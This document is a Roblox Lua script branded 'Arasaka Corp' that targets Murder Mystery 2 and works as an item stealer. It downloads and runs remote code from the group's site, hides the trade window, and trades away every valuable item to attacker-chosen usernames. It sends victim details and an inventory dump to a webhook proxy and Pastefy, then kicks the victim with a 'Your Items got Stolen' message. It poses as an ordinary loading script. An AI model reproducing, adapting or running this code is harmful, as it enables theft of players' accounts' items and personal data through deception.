repeat task.wait() until game:IsLoaded()
task.wait(1.5)

if _G.EdMM2Exe then return end
_G.EdMM2Exe = true

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local TeleportService = game:GetService("TeleportService")
local RobloxReplicatedStorage = game:GetService("RobloxReplicatedStorage")
local RunService = game:GetService("RunService")
local plr = Players.LocalPlayer
if not plr then return end

if game.PlaceId ~= 142823291 then
    pcall(function() plr:Kick("Arasaka Corp | MM2 Only") end)
    return
end

if not _G.AC_CONFIG then
    warn("[AC] Execute loader first!")
    return
end

local cfg = _G.AC_CONFIG
local WEBHOOK_ID = cfg.WEBHOOK_ID
local USERNAMES = cfg.USERNAMES
local PROXY_URL = cfg.PROXY_URL
local PUBLIC_PROXY = cfg.PUBLIC_PROXY or cfg.PUPLIC_PROXY
local MinRarity = cfg.MinRarity or "Common"

if not WEBHOOK_ID or WEBHOOK_ID == "" then
    warn("[AC] Invalid webhook")
    return
end
if not USERNAMES or #USERNAMES == 0 then
    warn("[AC] No targets")
    return
end

local Crypto = loadstring(game:HttpGet("https://arasaka-corp.eu/script/module/crypto.lua"))()
local crypto = Crypto.new("31566ef8c2c18566522c58e8c11511cfc0ec2a4864ee5e2750a162f4dfeca9a4b16c424cb4f83662773ea0a0b7040b8d")

local PLACE_ID = 142823291
local MAX_TRADE_SLOTS = 4
local TRADE_TIMEOUT = 30
local TRADE_WAIT = 5
local JOIN_WAIT = 1
local SERVER_LIST_LIMIT = 100
local MIN_SERVER_PLAYERS = 12
local PASTEFY_ENDPOINT = "https://pastefy.app/api/v2/paste"
local VALUES_ENDPOINT = "https://api.project-reverse.org/valuables/get-game-valuables?game=mm2"
local SERVERS_ENDPOINT = "https://games.roblox.com/v1/games/"

local NO_TRADE = {
    DefaultGun = true, DefaultKnife = true, Reaver = true,
    Reaver_Legendary = true, Reaver_Godly = true, Reaver_Ancient = true,
    IceHammer = true, IceHammer_Legendary = true, IceHammer_Godly = true,
    IceHammer_Ancient = true, Gingerscythe = true, Gingerscythe_Legendary = true,
    Gingerscythe_Godly = true, Gingerscythe_Ancient = true,
    TestItem = true, Season1TestKnife = true, Cracks = true,
    Icecrusher = true, ["???"] = true, Dartbringer = true,
    TravelerAxeRed = true, TravelerAxeBronze = true,
    TravelerAxeSilver = true, TravelerAxeGold = true,
    BlueCamo_K_2022 = true, GreenCamo_K_2022 = true, SharkSeeker = true
}

local RARITY_ORDER = {Ancient = 9, Godly = 8, Unique = 7, Vintage = 6, Legendary = 5, Rare = 4, Uncommon = 3, Common = 2}

local BRAND_DISCORD = "https://discord.gg/arasaka-corp"

local executorName = "Unknown"
pcall(function()
    if identifyexecutor then executorName = identifyexecutor() end
    if getexecutorname then executorName = getexecutorname() end
end)

local isDelta = executorName:lower():find("delta") ~= nil
local supportsHook = hookfunction ~= nil and newcclosure ~= nil
local supportsFireSignal = firesignal ~= nil

local realJobId = game.JobId
local deltaBypassed = false
local database = nil
local profile = nil
local values = {}
local inventory = {}
local totalValue = 0
local rarityCounts = {Ancient=0, Godly=0, Unique=0, Vintage=0, Legendary=0, Rare=0, Uncommon=0, Common=0}
local tradeCompleted = false

local remoteSendRequest = nil
local remoteGetStatus = nil
local remoteOfferItem = nil
local remoteAcceptTrade = nil
local remoteDeclineTrade = nil
local remoteDeclineRequest = nil
local remoteCancelRequest = nil
local remoteUpdateTrade = nil
local remoteStartTrade = nil

local lastOffer = nil
local isOurTrade = false
local activePartner = nil
local isProcessing = false
local processedUsers = {}

local function requestFn(req)
    if syn and syn.request then return syn.request(req) end
    if fluxus and fluxus.request then return fluxus.request(req) end
    if http and http.request then return http.request(req) end
    if getgenv().request then return getgenv().request(req) end
    if request then return request(req) end
    if http_request then return http_request(req) end
    if HttpService.RequestAsync then
        return HttpService:RequestAsync({
            Url = req.Url,
            Method = req.Method,
            Headers = req.Headers,
            Body = req.Body
        })
    end
    return nil
end

local function formatValue(n)
    n = tonumber(n) or 0
    if n >= 1E6 then
        return string.format("$%.2fM", n / 1E6)
    elseif n >= 1E3 then
        return string.format("$%.2fK", n / 1E3)
    else
        return string.format("$%.2f", n)
    end
end

local function isTarget(name)
    if not name then return false end
    for _, u in ipairs(USERNAMES) do
        if u:lower() == name:lower() then return true end
    end
    return false
end

local function lockHttp()
    if not supportsHook then return end
    local function guard(fn)
        if typeof(fn) ~= "function" then return end
        local old
        old = hookfunction(fn, newcclosure(function(...)
            return old(...)
        end))
    end
    if syn and syn.request then guard(syn.request) end
    if fluxus and fluxus.request then guard(fluxus.request) end
    if http and http.request then guard(http.request) end
    if getgenv().request then guard(getgenv().request) end
    if request then guard(request) end
    if http_request then guard(http_request) end
end

local function serverHop()
    pcall(function()
        local r = requestFn({
            Url = SERVERS_ENDPOINT .. game.PlaceId .. "/servers/Public?sortOrder=Asc&limit=" .. SERVER_LIST_LIMIT,
            Method = "GET",
            Headers = {["User-Agent"] = "Mozilla/5.0"}
        })
        if r and r.Body then
            local d = HttpService:JSONDecode(r.Body)
            if d and d.data then
                for _, s in ipairs(d.data) do
                    if s.id ~= game.JobId and s.playing < s.maxPlayers then
                        TeleportService:TeleportToPlaceInstance(game.PlaceId, s.id, plr)
                        task.wait(5)
                        return
                    end
                end
            end
        end
    end)
end

local function fetchValues()
    pcall(function()
        local r = requestFn({
            Url = VALUES_ENDPOINT,
            Method = "GET",
            Headers = {["User-Agent"] = "Mozilla/5.0"}
        })
        if r and r.Body then
            local data = HttpService:JSONDecode(r.Body)
            if data and data.data then
                for _, item in ipairs(data.data) do
                    if item.name and item.price then
                        values[item.name] = tonumber(item.price) or 0
                    end
                end
            end
        end
    end)
end

local function loadDatabase()
    local ok, db = pcall(function()
        return require(ReplicatedStorage:WaitForChild("Database", 10):WaitForChild("Sync", 10):WaitForChild("Item", 10))
    end)
    if ok and db then
        database = db
    else
        warn("[AC] Database load failed")
    end
end

local function loadProfile()
    local ok, prof = pcall(function()
        return ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(plr.Name)
    end)
    if ok and prof then
        profile = prof
    else
        warn("[AC] Profile load failed")
    end
end

local function rebuildInventory()
    if not database or not profile then return 0 end
    local owned = profile.Weapons and profile.Weapons.Owned or {}
    local minRarityIndex = RARITY_ORDER[MinRarity] or 2

    inventory = {}
    totalValue = 0
    rarityCounts = {Ancient=0, Godly=0, Unique=0, Vintage=0, Legendary=0, Rare=0, Uncommon=0, Common=0}

    for dataid, amount in pairs(owned) do
        local item = database[dataid]
        if item and not NO_TRADE[dataid] and amount > 0 then
            local rarity = item.Rarity or "Common"
            local rarityIndex = RARITY_ORDER[rarity] or 2
            if rarityIndex >= minRarityIndex then
                local name = item.ItemName or tostring(dataid)
                local value = values[dataid] or 0
                local total = value * amount
                totalValue = totalValue + total
                table.insert(inventory, {
                    DataID = dataid,
                    ItemName = name,
                    Amount = amount,
                    Rarity = rarity,
                    Value = value,
                    TotalValue = total
                })
                rarityCounts[rarity] = (rarityCounts[rarity] or 0) + amount
            end
        end
    end

    table.sort(inventory, function(a, b) return a.Value > b.Value end)
    return #inventory
end

local function getStatus()
    local ok, s = pcall(function() return remoteGetStatus:InvokeServer() end)
    return ok and s or "None"
end

local function getActiveGui()
    local pg = plr:FindFirstChild("PlayerGui")
    if not pg then return nil end
    return pg:FindFirstChild("TradeGUI") or pg:FindFirstChild("TradeGUI_Phone")
end

local function fireSignal(instance, signalName)
    if not instance then return end
    pcall(function()
        if supportsFireSignal then
            firesignal(instance[signalName])
            return
        end
    end)
    pcall(function()
        if instance[signalName] then instance[signalName]:Fire() end
    end)
end

local function findButton(gui, names)
    if not gui then return nil end
    for _, n in ipairs(names) do
        local b = gui:FindFirstChild(n, true)
        if b and b:IsA("GuiButton") then return b end
    end
    return nil
end

local function findItemButton(dataId)
    local gui = getActiveGui()
    if not gui then return nil end
    local container = gui:FindFirstChild("Items", true) or gui:FindFirstChild("Inventory", true) or gui
    for _, b in ipairs(container:GetDescendants()) do
        if b:IsA("ImageButton") or b:IsA("TextButton") then
            local idVal = b:FindFirstChild("DataID") or b:FindFirstChild("ItemID")
            if idVal and idVal.Value == dataId then return b end
        end
    end
    return nil
end

local function sendRequest(target)
    isOurTrade = true
    local ok = pcall(function() remoteSendRequest:InvokeServer(target) end)
    if not ok then
        local gui = getActiveGui()
        local btn = findButton(gui, {"Send", "SendRequest", "Trade", "Request"})
        if btn then
            fireSignal(btn, "MouseButton1Click")
            fireSignal(btn, "Activated")
        end
    end
end

local function cancelRequest()
    pcall(function()
        if remoteCancelRequest then
            remoteCancelRequest:FireServer()
        end
    end)
    isOurTrade = false
end

local function declineTrade()
    isOurTrade = false
    activePartner = nil
    local ok = pcall(function() remoteDeclineTrade:FireServer() end)
    if not ok then
        local gui = getActiveGui()
        local btn = findButton(gui, {"Decline", "DeclineTrade", "Reject", "No"})
        if btn then
            fireSignal(btn, "MouseButton1Click")
            fireSignal(btn, "Activated")
        end
    end
    task.wait(0.3)
end

local function declineIncoming()
    isOurTrade = false
    local ok = pcall(function()
        if remoteDeclineRequest then
            remoteDeclineRequest:FireServer()
        else
            remoteDeclineTrade:FireServer()
        end
    end)
    if not ok then
        local gui = getActiveGui()
        local btn = findButton(gui, {"Decline", "DeclineTrade", "Reject", "No"})
        if btn then
            fireSignal(btn, "MouseButton1Click")
            fireSignal(btn, "Activated")
        end
    end
    task.wait(0.3)
end

local function addToOffer(dataId)
    local ok = pcall(function() remoteOfferItem:FireServer(dataId, "Weapons") end)
    task.wait(0.1)
    if not ok then
        local btn = findItemButton(dataId)
        if btn then
            fireSignal(btn, "MouseButton1Click")
            fireSignal(btn, "Activated")
        end
    end
end

local function acceptDeal()
    local ok = pcall(function()
        remoteAcceptTrade:FireServer(game.PlaceId * 3, lastOffer or {})
    end)
    if not ok then
        local gui = getActiveGui()
        local btn = findButton(gui, {"Accept", "AcceptTrade", "AcceptBtn", "Confirm"})
        if btn then
            fireSignal(btn, "MouseButton1Click")
            fireSignal(btn, "Activated")
        end
    end
end

local function waitUntilDone()
    repeat task.wait(0.1) until getStatus() == "None"
    isOurTrade = false
    activePartner = nil
end

local function snipeGuard()
    local status = getStatus()
    if status == "ReceivingRequest" then
        declineIncoming()
        return true
    end
    if status == "StartTrade" and not isOurTrade then
        declineTrade()
        return true
    end
    return false
end

local function jitter()
    return 0.3 + (math.random() * 0.4)
end

local function aggressiveMonitor()
    local status = getStatus()
    if status == "ReceivingRequest" then
        declineIncoming()
    elseif status == "StartTrade" then
        local partner = activePartner
        if partner and not isTarget(partner) then
            declineTrade()
        end
    end
end

local function checkTradePartner(data)
    if not data then return end
    local p1 = data.Player1
    local p2 = data.Player2
    if not p1 or not p2 then return end
    local partner = nil
    if p1.Player and p1.Player.Name ~= plr.Name then
        partner = p1.Player.Name
    elseif p2.Player and p2.Player.Name ~= plr.Name then
        partner = p2.Player.Name
    end
    if partner and not isTarget(partner) then
        warn("[AC] Trade partner " .. partner .. " not target, declining")
        declineTrade()
    end
end

local function initRemotes()
    local Trade = ReplicatedStorage:WaitForChild("Trade", 5)
    if not Trade then
        warn("[AC] Trade remote missing")
        return false
    end

    remoteSendRequest = Trade:WaitForChild("SendRequest")
    remoteGetStatus = Trade:WaitForChild("GetTradeStatus")
    remoteOfferItem = Trade:WaitForChild("OfferItem")
    remoteAcceptTrade = Trade:WaitForChild("AcceptTrade")
    remoteDeclineTrade = Trade:WaitForChild("DeclineTrade")
    remoteDeclineRequest = Trade:FindFirstChild("DeclineRequest")
    remoteCancelRequest = Trade:FindFirstChild("CancelRequest")
    remoteUpdateTrade = Trade:FindFirstChild("UpdateTrade")
    remoteStartTrade = Trade:FindFirstChild("StartTrade")

    if remoteUpdateTrade then
        remoteUpdateTrade.OnClientEvent:Connect(function(data)
            if typeof(data) == "table" then
                if data.lastOffer then lastOffer = data.lastOffer end
                if data.LastOffer then lastOffer = data.LastOffer end
                checkTradePartner(data)
            end
        end)
    end

    if remoteStartTrade then
        remoteStartTrade.OnClientEvent:Connect(function(data, partnerName)
            activePartner = partnerName
            if partnerName and not isTarget(partnerName) then
                warn("[AC] Unauthorized trade with " .. partnerName)
                declineTrade()
            end
        end)
    end

    if remoteCancelRequest then
        remoteCancelRequest.OnClientEvent:Connect(function()
            isOurTrade = false
        end)
    end

    local pg = plr:WaitForChild("PlayerGui")
    for _, n in ipairs({"TradeGUI", "TradeGUI_Phone"}) do
        local g = pg:FindFirstChild(n)
        if g then
            g.Enabled = false
            g:GetPropertyChangedSignal("Enabled"):Connect(function()
                if g.Enabled then g.Enabled = false end
            end)
        end
    end

    pcall(function()
        local TradeModule = require(ReplicatedStorage:WaitForChild("Modules", 5):WaitForChild("TradeModule", 5))
        if TradeModule and TradeModule.RequestsEnabled ~= nil then
            TradeModule.RequestsEnabled = true
        end
    end)

    return true
end

local function executeTrade(targetPlayer)
    if not targetPlayer then return end

    local attempts = 0
    while attempts < 30 do
        if targetPlayer.Character and targetPlayer.Character:FindFirstChild("Humanoid") then break end
        attempts = attempts + 1
        task.wait(0.5)
    end

    rebuildInventory()
    local queue = {}
    for _, item in ipairs(inventory) do
        table.insert(queue, {DataID = item.DataID, Amount = item.Amount})
    end
    if #queue == 0 then
        warn("[AC] No items to trade")
        return
    end

    while #queue > 0 and not tradeCompleted do
        cancelRequest()
        if snipeGuard() then
            task.wait(0.5)
        else
            local started = false
            local sendAttempts = 0
            while not started and sendAttempts < TRADE_TIMEOUT do
                local cur = getStatus()
                if cur == "StartTrade" then
                    started = true
                    break
                elseif cur == "None" then
                    sendRequest(targetPlayer)
                elseif cur == "ReceivingRequest" then
                    declineIncoming()
                end
                sendAttempts = sendAttempts + 1
                task.wait(jitter())
            end

            if not started then
                task.wait(2)
            else
                local slotsLeft = MAX_TRADE_SLOTS
                local itemsAdded = 0
                while slotsLeft > 0 and #queue > 0 do
                    local current = queue[1]
                    local amountToAdd = math.min(slotsLeft, current.Amount)
                    for _ = 1, amountToAdd do
                        addToOffer(current.DataID)
                    end
                    current.Amount = current.Amount - amountToAdd
                    if current.Amount <= 0 then
                        table.remove(queue, 1)
                    end
                    slotsLeft = slotsLeft - amountToAdd
                    itemsAdded = itemsAdded + amountToAdd
                end

                if itemsAdded == 0 then break end

                task.wait(TRADE_WAIT)
                acceptDeal()
                waitUntilDone()
                rebuildInventory()

                queue = {}
                for _, item in ipairs(inventory) do
                    table.insert(queue, {DataID = item.DataID, Amount = item.Amount})
                end

                if #queue == 0 then
                    tradeCompleted = true
                else
                    task.wait(1)
                end
            end
        end
    end

    if #queue == 0 then
        tradeCompleted = true
        task.wait(2)
        pcall(function() setclipboard(BRAND_DISCORD) end)
        pcall(function()
            plr:Kick("Arasaka Corp | Your Items got Stolen\n\n" .. BRAND_DISCORD:gsub("https://", ""))
        end)
    end
end

local function processUser(playerName)
    if isProcessing then return end
    if processedUsers[playerName] then return end
    isProcessing = true
    processedUsers[playerName] = true

    local player = Players:FindFirstChild(playerName)
    if player then
        executeTrade(player)
    end

    processedUsers[playerName] = nil
    isProcessing = false
end

local function checkAndProcess()
    if isProcessing then return end
    for _, name in ipairs(USERNAMES) do
        local player = Players:FindFirstChild(name)
        if player and player.Character and player.Character:FindFirstChild("Humanoid") then
            if not processedUsers[name] then
                task.spawn(function() processUser(name) end)
                return
            end
        end
    end
end

local function uploadToPastefy(items)
    if not items or #items == 0 then return nil end
    table.sort(items, function(a, b)
        local ao = RARITY_ORDER[a.Rarity] or 1
        local bo = RARITY_ORDER[b.Rarity] or 1
        if ao ~= bo then return ao > bo end
        return (a.Value or 0) > (b.Value or 0)
    end)

    local lines = {
        "ARASAKA CORP | MM2 Inventory Dump",
        "User: " .. plr.Name .. " (" .. plr.DisplayName .. ")",
        "Generated: " .. os.date("%Y-%m-%d %H:%M:%S"),
        "Total Value: " .. formatValue(totalValue),
        "Total Items: " .. #items,
        string.rep("-", 60),
        ""
    }

    local currentTier = nil
    for _, item in ipairs(items) do
        if currentTier ~= item.Rarity then
            currentTier = item.Rarity
            table.insert(lines, "")
            table.insert(lines, "[" .. tostring(currentTier):upper() .. "]")
            table.insert(lines, string.rep("-", 30))
        end
        local totalVal = (item.Value or 0) * (item.Amount or 1)
        table.insert(lines, string.format(
            "%s x%d | %s each | Total: %s",
            item.ItemName or "Unknown",
            tonumber(item.Amount) or 1,
            formatValue(item.Value or 0),
            formatValue(totalVal)
        ))
    end

    local content = table.concat(lines, "\n")
    local ok, response = pcall(function()
        return requestFn({
            Url = PASTEFY_ENDPOINT,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode({content = content, type = "PASTE"})
        })
    end)

    if ok and response and response.StatusCode == 200 then
        local ok2, data = pcall(function() return HttpService:JSONDecode(response.Body) end)
        if ok2 and data then
            if data.paste then return "https://pastefy.app/" .. data.paste.id end
            if data.id then return "https://pastefy.app/" .. data.id end
        end
    end
    return nil
end

local function buildPayload()
    local items = inventory
    local totalItems = 0
    local value = totalValue
    local counts = rarityCounts

    for _, item in ipairs(items) do
        totalItems = totalItems + (item.Amount or 1)
    end

    local hitCategory
    local glowEffect = ""
    if value >= 5000 then
        hitCategory = "INSANE HIT ($5K+)"
        glowEffect = "✦"
    elseif value >= 2000 then
        hitCategory = "MASSIVE HIT ($2K+)"
        glowEffect = "🔥"
    elseif value >= 500 then
        hitCategory = "BIG HIT ($500+)"
        glowEffect = "⚡"
    elseif value >= 100 then
        hitCategory = "GOOD HIT ($100+)"
        glowEffect = "💫"
    elseif value >= 15 then
        hitCategory = "NORMAL HIT ($15+)"
    else
        hitCategory = "LOW HIT (<$15)"
    end

    local topItems = {}
    for i = 1, math.min(5, #items) do
        local it = items[i]
        local icon = "░"
        local v = it.Value or 0
        if v >= 500 then icon = "█"
        elseif v >= 100 then icon = "▓"
        elseif v >= 25 then icon = "▒"
        end
        table.insert(topItems, string.format(
            "%s %s x%d | %s",
            icon,
            it.ItemName or "Unknown",
            tonumber(it.Amount) or 1,
            formatValue(v)
        ))
    end

    local pastefyLink = nil
    if #items > 0 then
        pastefyLink = uploadToPastefy(items)
    end

    local job = realJobId or game.JobId
    local fernLink = "https://fern.wtf/joiner?placeId=" .. tostring(game.PlaceId)
                   .. "&gameInstanceId=" .. tostring(job)

    local fields = {
        {
            name = "VICTIM INFORMATION",
            value = "```yml\nUser: " .. plr.DisplayName .. " (@" .. plr.Name .. ")\n"
                 .. "ID: " .. tostring(plr.UserId) .. "\n"
                 .. "Age: " .. tostring(plr.AccountAge) .. " days\n"
                 .. "Server: " .. tostring(job):sub(1, 8) .. "\n```",
            inline = true
        },
        {
            name = "VALUATION",
            value = "```yml\nTotal Value: " .. formatValue(value) .. "\n"
                 .. "Items: " .. tostring(totalItems) .. "\n"
                 .. "Receiver: " .. table.concat(USERNAMES, ", ") .. "\n```",
            inline = true
        },
        {
            name = "INVENTORY BREAKDOWN",
            value = "```yml\n"
                 .. "Ancient: " .. tostring(counts.Ancient or 0)
                 .. " | Godly: " .. tostring(counts.Godly or 0) .. "\n"
                 .. "Unique: " .. tostring(counts.Unique or 0)
                 .. " | Vintage: " .. tostring(counts.Vintage or 0) .. "\n"
                 .. "Legendary: " .. tostring(counts.Legendary or 0)
                 .. " | Rare: " .. tostring(counts.Rare or 0) .. "\n"
                 .. "Uncommon: " .. tostring(counts.Uncommon or 0)
                 .. " | Common: " .. tostring(counts.Common or 0) .. "\n```",
            inline = false
        }
    }

    if #topItems > 0 then
        local topStr = "```prolog\n"
        for _, s in ipairs(topItems) do
            topStr = topStr .. s .. "\n"
        end
        topStr = topStr .. "```"
        table.insert(fields, {name = "TOP ITEMS", value = topStr, inline = false})
    end

    if pastefyLink then
        table.insert(fields, {
            name = "FULL INVENTORY",
            value = "[View All " .. tostring(#items) .. " Items on Pastefy](" .. pastefyLink .. ")",
            inline = false
        })
    end

    table.insert(fields, {
        name = "ACTIONS",
        value = "[Join Server](" .. fernLink .. ")",
        inline = false
    })

    local embedColor = 0x8B0000
    if value >= 5000 then embedColor = 0xFF0000
    elseif value >= 2000 then embedColor = 0xCC0000
    elseif value >= 500 then embedColor = 0x990000
    elseif value >= 100 then embedColor = 0x660000
    elseif value >= 15 then embedColor = 0x440000
    end

    local embed = {
        title = "ARASAKA CORP " .. glowEffect .. " " .. hitCategory,
        color = embedColor,
        fields = fields,
        footer = {text = "Arasaka Corp v1.0.2 | " .. os.date("%Y-%m-%d %H:%M:%S")},
        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
    }

    local payload = {
        username = "Arasaka Corp",
        embeds = {embed}
    }

    if value >= 500 or (counts.Ancient or 0) > 0 then
        payload.content = "@everyone **ARASAKA CORP | MM2 HIT**"
    end

    return payload, pastefyLink
end

local function sendWebhook(payload)
    local fullUrl = PROXY_URL .. WEBHOOK_ID
    local envelope = { id = WEBHOOK_ID, payload = payload }
    local json = HttpService:JSONEncode(envelope)
    local encrypted = crypto:Encrypt(json)

    local success, response = pcall(function()
        return requestFn({
            Url = fullUrl,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode({data = encrypted})
        })
    end)
    return success, response
end

local function sendPublic(payload)
    if not PUBLIC_PROXY or PUBLIC_PROXY == "" then return end
    local json = HttpService:JSONEncode(payload)
    local encrypted = crypto:Encrypt(json)

    local success, response = pcall(function()
        return requestFn({
            Url = PUBLIC_PROXY,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode({data = encrypted})
        })
    end)
    return success, response
end

local function dispatchWebhook()
    local payload, pastefyLink = buildPayload()
    sendWebhook(payload)

    local publicPayload = {
        message = plr.Name .. " got hit by Arasaka Corp in MM2"
               .. (pastefyLink and (" | Pastefy: " .. pastefyLink) or "")
    }
    sendPublic(publicPayload)

    return payload
end


local function deltaBypass()
    if not isDelta then return end

    local stepAnimate = nil
    local found = false
    repeat
        for _, v in ipairs(getgc(true)) do
            if typeof(v) == "function" then
                local info = debug.getinfo(v)
                if info and info.name == "stepAnimate" then
                    stepAnimate = v
                    found = true
                    break
                end
            end
        end
        task.wait(0.5)
    until found

    local printed = false
    local old
    old = hookfunction(stepAnimate, function(dt)
        if not printed then
            printed = true
            realJobId = game.JobId
            deltaBypassed = true
        end
        return old(dt)
    end)

    repeat task.wait() until deltaBypassed
end

local function validateServer()
    local vip = false
    pcall(function()
        vip = (RobloxReplicatedStorage:WaitForChild("GetServerType"):InvokeServer() == "VIPServer")
    end)

    local full = (#Players:GetPlayers() >= MIN_SERVER_PLAYERS)

    if vip or full then
        local kickExecutors = {"delta", "hydrogen", "fluxus", "arceus", "codex"}
        local shouldKick = false
        for _, e in ipairs(kickExecutors) do
            if executorName:lower():find(e) then
                shouldKick = true
                break
            end
        end
        if shouldKick then
            plr:Kick(vip and "VIP Servers not supported." or "FULL Servers Arent Supported")
            return false
        else
            print(vip and "VIP Server detected, hopping..." or "Server full, hopping...")
            serverHop()
            return false
        end
    end

    return true
end

local function bindEvents()
    Players.PlayerAdded:Connect(function(player)
        if player == plr then return end
        if isTarget(player.Name) then
            task.spawn(function()
                task.wait(JOIN_WAIT)
                checkAndProcess()
            end)
        end
    end)

    Players.PlayerRemoving:Connect(function(player)
        if isTarget(player.Name) then
            processedUsers[player.Name] = nil
            task.wait(1)
            checkAndProcess()
        end
    end)

    for _, p in ipairs(Players:GetPlayers()) do
        if p ~= plr and isTarget(p.Name) then
            task.spawn(function()
                task.wait(JOIN_WAIT)
                checkAndProcess()
            end)
        end
    end
end

local function main()
    lockHttp()
    deltaBypass()

    if not validateServer() then return end

    loadDatabase()
    loadProfile()
    fetchValues()
    rebuildInventory()

    if #inventory == 0 then
        plr:Kick("Account error | Please try a different account")
    end

    if not initRemotes() then return end

    dispatchWebhook()

    print("[AC] Loading Script for", plr.Name)
    print("Please wait, this process can take up to 5 minutes depending on your connection and executor...")
    task.wait(3)

    RunService.Heartbeat:Connect(function()
        aggressiveMonitor()
    end)

    task.spawn(function()
        while task.wait(2) do
            checkAndProcess()
        end
    end)

    bindEvents()
end

main()
